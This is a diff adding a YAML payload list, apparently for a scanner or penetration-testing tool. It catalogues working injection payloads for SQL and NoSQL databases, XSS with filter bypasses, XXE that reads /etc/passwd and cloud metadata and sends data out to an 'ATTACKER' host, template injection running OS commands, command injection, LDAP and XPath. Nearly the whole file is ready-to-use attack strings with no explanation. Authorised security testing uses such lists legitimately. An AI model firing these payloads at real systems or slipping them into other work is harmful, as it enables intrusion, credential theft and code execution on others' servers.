@@ -1,0 +1,143 @@
+# Injection Attack Payloads - SQLi, XSS, XXE, SSTI, CMDi
+
+sqli:
+  detection:
+    - "'"
+    - '"'
+    - "`"
+    - "' OR '1'='1"
+    - "' AND '1'='2"
+    - "' WAITFOR DELAY '0:0:5'--"
+    - "' AND SLEEP(5)--"
+    - "1' ORDER BY 1--"
+    - "1' UNION SELECT NULL--"
+    - "1; SELECT 1--"
+
+  union_based:
+    - "' UNION SELECT NULL,NULL,NULL--"
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT username,password,3 FROM users--"
+    - "' UNION SELECT table_name,column_name,3 FROM information_schema.columns--"
+    - "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables--"
+
+  blind_boolean:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' AND SUBSTRING(@@version,1,1)='5'--"
+    - "' AND (SELECT COUNT(*) FROM users)>0--"
+
+  blind_time:
+    - "' AND SLEEP(5)--"
+    - "' AND BENCHMARK(10000000,SHA1('test'))--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "' AND IF(1=1,SLEEP(5),0)--"
+
+  error_based:
+    - "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
+    - "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+
+  nosql:
+    - '{"$gt": ""}'
+    - '{"$ne": null}'
+    - '{"$regex": ".*"}'
+    - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    - "[$ne]=1"
+    - "[$gt]="
+    - "[$regex]=.*"
+
+xss:
+  basic:
+    - "<script>alert(1)</script>"
+    - '<img src=x onerror=alert(1)>'
+    - '<svg onload=alert(1)>'
+    - "javascript:alert(1)"
+    - '"><script>alert(1)</script>'
+    - "'-alert(1)-'"
+    - '<body onload=alert(1)>'
+
+  filter_bypass:
+    - '<img src=x onerror="alert(1)">'
+    - '<svg/onload=alert(1)>'
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<<script>alert(1)//"
+    - '<img src=x onerror=alert`1`>'
+    - '<details open ontoggle=alert(1)>'
+    - '<marquee onstart=alert(1)>'
+    - "&#60;script&#62;alert(1)&#60;/script&#62;"
+
+  dom_based:
+    - "#<img src=x onerror=alert(1)>"
+    - "javascript:alert(document.domain)"
+    - '<iframe src="javascript:alert(1)">'
+
+  polyglot:
+    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+
+xxe:
+  basic:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+
+  blind:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>'
+
+  parameter_entity:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM &apos;http://ATTACKER/?x=%file;&apos;>">%eval;%exfil;]>'
+
+ssti:
+  detection:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "#{7*7}"
+    - "{{config}}"
+    - "{{self}}"
+
+  jinja2:
+    - "{{config.items()}}"
+    - "{{''.__class__.__mro__[1].__subclasses__()}}"
+    - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+
+  twig:
+    - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+
+  freemarker:
+    - '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
+
+cmdi:
+  basic:
+    - "; id"
+    - "| id"
+    - "|| id"
+    - "& id"
+    - "&& id"
+    - "$(id)"
+    - "`id`"
+
+  blind:
+    - "; sleep 5"
+    - "| sleep 5"
+    - "&& sleep 5"
+    - "$(sleep 5)"
+    - "; ping -c 5 127.0.0.1"
+
+  filter_bypass:
+    - ";{id}"
+    - "| /usr/bin/id"
+    - "$({i}d)"
+    - "i]d"
+    - "${IFS}id"
+    - ";$'\\x69\\x64'"
+
+ldap:
+  - "*)(uid=*))(|(uid=*"
+  - "admin)(&)"
+  - "*()|&'"
+  - "admin)(|(password=*)"
+
+xpath:
+  - "' or '1'='1"
+  - "' or ''='"
+  - "x' or name()='username' or 'x'='y"
